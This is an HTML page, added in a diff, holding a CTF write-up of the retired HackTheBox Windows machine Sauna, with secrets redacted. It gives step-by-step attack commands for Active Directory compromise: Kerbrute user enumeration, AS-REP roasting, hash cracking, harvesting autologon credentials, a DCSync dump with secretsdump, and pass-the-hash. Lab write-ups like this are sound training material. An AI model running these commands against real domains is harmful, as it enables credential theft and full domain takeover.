@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Sauna &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge htb">HTB</span>
+      <span class="badge os">Windows</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>Sauna</h1>
+    <div class="meta">Target: <code>10.10.10.175</code></div>
+    <div class="tags"><span class="tag">Windows</span><span class="tag">ActiveDirectory</span><span class="tag">LDAP</span><span class="tag">Kerbrute</span><span class="tag">ASREPRoast</span><span class="tag">hashcat</span><span class="tag">WinRM</span><span class="tag">WinPEAS</span><span class="tag">BloodHound</span><span class="tag">DCSync</span><span class="tag">secretsdump</span><span class="tag">PassTheHash</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#as-rep-roasting-fsmith">AS-REP Roasting fsmith</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#autologon-creds-dcsync">Autologon Creds → DCSync</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>Sauna is an easy Windows AD box that walks the full domain-compromise path: build a user list from a website and Kerberos brute force, <strong>AS-REP roast</strong> an account, find autologon credentials with WinPEAS, then abuse <strong>DCSync</strong> rights to dump the Administrator hash and pass it. It's a close cousin of Forest and reinforces the same AD fundamentals.</p>
+<blockquote>
+<p><strong>Screenshot would help here:</strong> the privesc hinges on BloodHound showing <code>svc_loanmgr</code> with GetChanges/GetChangesAll (DCSync) on the domain. A screenshot of that node's outbound rights makes the escalation obvious.</p>
+</blockquote>
+<h2 id="recon">Recon</h2>
+<p>The site is a bank with employee names but little else technically. LDAP gave the domain naming context but no anonymous user dump, so I brute-forced usernames with Kerbrute against a name-based pattern:</p>
+<pre><code class="language-sh">ldapsearch -x -h 10.10.10.175 -s base namingcontexts   -&gt;   DC=EGOTISTICAL-BANK,DC=LOCAL
+kerbrute userenum -d EGOTISTICAL-BANK.LOCAL xato-net-10-million-usernames.txt --dc 10.10.10.175
+-&gt;  administrator, hsmith, fsmith, sauna
+</code></pre>
+<blockquote>
+<p><strong>Why Kerbrute:</strong> it validates usernames via Kerberos pre-auth responses without logging failed logons the way SMB does, quiet user enumeration. Employee full names from the site shape the wordlist (<code>fsmith</code> = F. Smith).</p>
+</blockquote>
+<h2 id="foothold">Foothold</h2>
+<h3 id="as-rep-roasting-fsmith">AS-REP Roasting fsmith</h3>
+<p>Requesting AS-REP tickets for the user list returned a crackable hash for <code>fsmith</code> (pre-auth not required):</p>
+<pre><code class="language-sh">impacket-getNPUsers 'EGOTISTICAL-BANK.LOCAL/' -usersfile users.txt -format hashcat -dc-ip 10.10.10.175
+$krb5$‹redacted›
+</code></pre>
+<pre><code class="language-sh">hashcat -m 18200 hashes rockyou.txt   -&gt;   fsmith : ‹redacted›
+evil-winrm -i 10.10.10.175 -u fsmith -p ‹redacted›
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="autologon-creds-dcsync">Autologon Creds → DCSync</h3>
+<p>WinPEAS found <strong>autologon</strong> credentials stored in the registry in plaintext:</p>
+<pre><code>svc_loanmanager : ‹redacted›
+</code></pre>
+<blockquote>
+<p><strong>Why autologon leaks creds:</strong> when Windows is configured to log in automatically, it stores <code>DefaultUserName</code>/<code>DefaultPassword</code> in cleartext under <code>HKLM\...\Winlogon</code>. WinPEAS reads them directly. This handed me the <code>svc_loanmgr</code> account.</p>
+</blockquote>
+<p>BloodHound showed <code>svc_loanmgr</code> holds <strong>GetChanges</strong> and <strong>GetChangesAll</strong> on the domain, the two rights that together permit <strong>DCSync</strong>. So I replicated the Administrator hash:</p>
+<pre><code class="language-sh">impacket-secretsdump 'svc_loanmgr:‹redacted›@10.10.10.175'
+Administrator NTLM: ‹redacted›
+</code></pre>
+<h2 id="root">Root</h2>
+<p>Pass-the-hash as Administrator (any of wmiexec / psexec / evil-winrm):</p>
+<pre><code class="language-sh">evil-winrm -i 10.10.10.175 -u administrator -H ‹redacted›
+</code></pre>
+<p>Box rooted.</p>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>Turn names into usernames.</strong> Website employee names + Kerbrute produced the valid user list.</li>
+<li><strong>AS-REP roasting</strong> again provides a credential with zero prior access.</li>
+<li><strong>Autologon stores passwords in cleartext</strong>, WinPEAS surfaces them instantly.</li>
+<li><strong>GetChanges + GetChangesAll = DCSync = domain admin.</strong> Replicate the Administrator hash and pass it.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
